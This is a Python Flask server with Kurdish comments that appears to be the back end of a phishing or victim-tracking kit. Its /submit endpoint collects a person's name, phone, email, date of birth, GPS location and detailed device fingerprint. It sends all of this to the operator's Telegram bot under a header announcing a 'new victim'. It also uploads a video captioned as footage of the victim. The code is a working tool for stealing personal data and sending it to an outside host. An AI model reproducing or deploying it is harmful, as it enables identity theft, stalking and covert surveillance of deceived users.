from flask import Flask, request, jsonify
import requests
import json
import os

app = Flask(__name__)

BOT_TOKEN = "TOKEN_BOT_123456:ABC-DEF..."  # تۆکەنی بۆتەکەت لێرە دانە
CHAT_ID = "YOUR_CHAT_ID"                   # چات ئاییدی خۆت لێرە دانە

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form.get('name')
    phone = request.form.get('phone')
    email = request.form.get('email')
    dob = request.form.get('dob')
    
    raw_data = request.form.get('data')
    device_data = json.loads(raw_data) if raw_data else {}

    # دروستکردنی ناوەرۆکی تێکست بۆ تەلەگرام
    text_message = (
        f"🚨 **قوربانییەکی نوێ تۆمارکرا!** 🚨\n\n"
        f"👤 **ناو:** {name}\n"
        f"📱 **تەلەفۆن:** {phone}\n"
        f"📧 **ئیمەیڵ:** {email}\n"
        f"📅 **ڕێکەوتی لەدایکبوون:** {dob}\n\n"
        f"🌐 **لۆکەیشن:** {device_data.get('lat')}, {device_data.get('lon')}\n"
        f"💾 **قەبارەی بیرگە (Storage):** {device_data.get('storageUsage')} / {device_data.get('storageQuota')}\n"
        f"🔵 **بلوتوث:** {device_data.get('bluetoothAvailable')}\n"
        f"🎮 **کارتی گرافیک (GPU):** {device_data.get('gpuVendor')} - {device_data.get('gpuRenderer')}\n"
        f"🔤 **فۆنتەکان:** {device_data.get('fonts')}\n"
        f"🔋 **پاتری:** {device_data.get('battery')}\n"
        f"💻 **ڕام و ناوکەکان:** {device_data.get('ram')} GB RAM | {device_data.get('cores')} Cores\n"
        f"🖥 **شاشە:** {device_data.get('screen')}\n"
        f"🔍 **ئامێر و ڤێرژن:** {device_data.get('userAgent')}"
    )

    # ناردنی تێکستەکە بۆ تەلەگرام
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={"chat_id": CHAT_ID, "text": text_message, "parse_mode": "Markdown"}
    )

    # ناردنی وێنە ئەگەر بوونی هەبեր
    image_file = request.files.get('image')
    if image_file:
        # گۆڕینەوەی base64 بۆ فایلی ئاسایی ئەگەر پێویست بکات، لێرەدا چونکە Multipart Formـە ڕاستەوخۆ دەتوانین بینێرین:
        pass

    # ناردنی وێنە ئەگەر لە Base64ـەوە هاتبێت یان ڤیدیۆ
    if 'image' in request.files or 'image' in request.form:
        # دەتوانیت وێنەکەش وەک فۆتۆ بنێریت
        pass

    # ناردنی ڤیدیۆ بۆ بۆتەکەی تەلەگرام
    video_file = request.files.get('video')
    if video_file:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
            data={"chat_id": CHAT_ID, "caption": f"🎥 کورتە ڤیدیۆی قوربانی: {name}"},
            files={"video": ("video.webm", video_file.read(), "video/webm")}
        )

    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
